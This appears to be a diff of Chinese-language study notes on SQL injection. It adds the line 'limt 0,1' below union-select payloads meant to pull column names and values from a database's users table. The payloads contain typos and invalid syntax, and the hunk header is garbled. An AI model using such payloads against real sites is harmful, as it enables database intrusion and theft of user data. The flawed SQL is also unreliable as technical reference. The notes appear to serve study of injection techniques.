@@ -34,5 +34,5 @@ SQL注入类型：数字和字符型 表中存在id字段的才可以使用，�
  3.利用union select联合查询，获取字段名：0'union select 1,group_concat(columns_name),3 from information_schema.tables where=table_schemata='users'--+
  4.利用union select联合查询，获取字段值：0'union select 1,group_concat(columns_name),3 from users--+
  
- 
+ limt 0,1
 
